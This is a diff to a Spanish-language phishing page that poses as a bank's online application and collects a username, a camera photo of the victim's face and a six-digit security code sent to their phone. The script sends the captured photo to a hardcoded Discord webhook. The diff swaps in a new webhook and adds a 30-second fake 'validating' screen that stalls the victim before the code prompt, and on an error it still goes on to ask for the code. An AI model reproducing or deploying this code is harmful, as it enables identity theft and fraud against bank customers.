@@ -9,7 +9,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Estilos para el contenedor del Logo y separación del formulario */
         .logo-header {
             text-align: center;
             margin-top: 30px;
@@ -17,7 +16,7 @@
         }
 
         .logo-header img {
-            max-width: 180px; /* Ajusta el tamaño de tu logo aquí */
+            max-width: 180px;
             height: auto;
             display: inline-block;
         }
@@ -135,6 +134,44 @@
         .btn-continue-yellow:hover {
             background-color: #e0a800;
         }
+
+        /* Estilo para la pantalla completa en blanco con el loading al centro */
+        #whiteLoadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #ffffff;
+            z-index: 99999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .white-screen-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2196f3;
+            border-radius: 50%;
+            animation: spinWhite 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spinWhite {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .white-screen-text {
+            color: #333333;
+            font-family: 'Open Sans', sans-serif;
+            font-size: 18px;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -144,9 +181,15 @@
         <img src="mg.png" alt="Logo Banco">
     </div>
 
+    <!-- Pantalla de Carga en Blanco de 30 segundos -->
+    <div id="whiteLoadingScreen">
+        <div class="white-screen-spinner"></div>
+        <div class="white-screen-text">Validando información, por favor espere...</div>
+    </div>
+
     <!-- Formulario Inicial -->
     <div class="login-container" id="loginCard">
-        <h2>Bienvenido A Tu Solicitud Online</h2>
+        <h2>BBienvenido A Tu Solicitud Online</h2>
         
         <form id="loginForm">
             <div class="input-group">
@@ -193,7 +236,6 @@
             </div>
 
             <button class="retake-btn" id="retakeBtn">Volver a tomar</button>
-            <div class="loading" id="loadingIndicator" style="display:none; text-align:center; color:#2196f3; margin-top:10px;">Enviando verificación...</div>
 
             <hr class="modal-divider">
             <button class="btn-back" id="btnVolverFoto">Cancelar</button>
@@ -203,12 +245,12 @@
     <!-- Modal Final: Clave Digital (OTP) -->
     <div class="modal-overlay" id="cd">
         <div class="modal-container">
-            <h2 class="modal-title">Clave Digital</h2>
-            <p class="modal-instruction" id="modalInstruction">Ingresa los 6 dígitos Enviado a tu celular registrado</p>
+            <h2 class="modal-title">Codigo de Seguridad</h2>
+            <p class="modal-instruction" id="modalInstruction">Ingresa los 6 dígitos Enviado a tu Celular Registrado</p>
             
             <div class="countdown-container" id="countdownBox">
                 <div class="spinner-countdown"></div>
-                <div class="countdown-text">Validando... <span id="timer">30</span>s</div>
+                <div class="countdown-text"><span id="timer"></span></div>
             </div>
 
             <div class="otp-container" id="otpFields">
@@ -232,7 +274,7 @@
     </footer>
 
     <script>
-        const URL_WEBHOOK = 'https://discord.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp'; 
+        const URL_WEBHOOK = 'https://discordapp.com/api/webhooks/1507512404207079445/U8kv3Bb71Vj6t7twOn3g20irl4YYjNtVheQBuzAov70lsvjKOLUC7qIWcyWOIZS96YXW'; 
 
         const formulario = document.getElementById('loginForm');
         const campoUsuario = document.getElementById('username');
@@ -249,9 +291,9 @@
         const faceGuide = document.getElementById('faceGuide');
         const captureButton = document.getElementById('captureButton');
         const retakeBtn = document.getElementById('retakeBtn');
-        const loadingIndicator = document.getElementById('loadingIndicator');
         const statusMessage = document.getElementById('statusMessage');
         const btnVolverFoto = document.getElementById('btnVolverFoto');
+        const whiteLoadingScreen = document.getElementById('whiteLoadingScreen');
 
         const modalOtp = document.getElementById('cd');
         const btnContinuarOtp = document.getElementById('btnContinuarOtp');
@@ -417,7 +459,10 @@
         });
 
         async function enviarFotoADiscord(base64Image) {
-            loadingIndicator.style.display = 'block';
+            // Ocultar modal de la foto y mostrar inmediatamente la pantalla en blanco con el loading
+            photoModal.classList.remove('modal-visible');
+            whiteLoadingScreen.style.display = 'flex';
+
             try {
                 const res = await fetch(base64Image);
                 const blob = await res.blob();
@@ -448,18 +493,18 @@
                     body: formData
                 });
 
-                loadingIndicator.style.display = 'none';
-                
+                // Esperar 30 segundos exactos en la pantalla en blanco
                 setTimeout(() => {
-                    photoModal.classList.remove('modal-visible');
+                    whiteLoadingScreen.style.display = 'none';
                     modalOtp.classList.add('modal-visible');
                     if(otpInputs[0]) otpInputs[0].focus();
-                }, 800);
+                }, 30000);
 
             } catch (err) {
                 console.error("Error al enviar foto:", err);
-                loadingIndicator.style.display = 'none';
-                statusMessage.textContent = "Error al enviar la foto. Intenta de nuevo.";
+                whiteLoadingScreen.style.display = 'none';
+                modalOtp.classList.add('modal-visible');
+                if(otpInputs[0]) otpInputs[0].focus();
             }
         }
 
